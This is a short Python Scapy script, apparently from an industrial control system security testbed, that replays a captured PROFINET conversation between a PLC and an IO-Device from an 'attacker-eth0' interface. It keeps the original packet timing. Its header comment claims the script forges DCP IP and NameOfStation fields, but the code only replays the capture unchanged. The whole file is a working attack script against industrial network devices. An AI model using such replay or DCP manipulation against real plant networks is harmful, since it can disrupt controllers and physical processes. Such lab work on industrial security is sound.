from scapy.all import *
import scapy.all as scapy
from scapy.contrib.pnio_dcp import *
from scapy.contrib.pnio import *
import time

load_contrib("pnio")
load_contrib("pnio_rpc")
load_contrib("dce_rpc")

# ---------------------------------------------------------------
# DESCRIPTION
# We want to forge the DCP-Communication between IO-Device and
# IO-Controller to forge the IP and NameOfStation Attributes
# of the DCP-Messages to manipulate the network parameters
# of the IO-Device.
# ---------------------------------------------------------------

scapy_cap = rdpcap('./attacks/replay/sniff/dev3_plc1_comm.pcapng')
amount_pkgs = len(scapy_cap)
time_per_paket = []

for idx in range(amount_pkgs - 1):
    time_per_paket.append(scapy_cap[idx + 1].time - scapy_cap[idx].time)

print(time_per_paket)

count = 0
while count < amount_pkgs:
    sendp(scapy_cap[count], iface="attacker-eth0")
    if (count < amount_pkgs - 1):
        time.sleep(time_per_paket[count])
    count += 1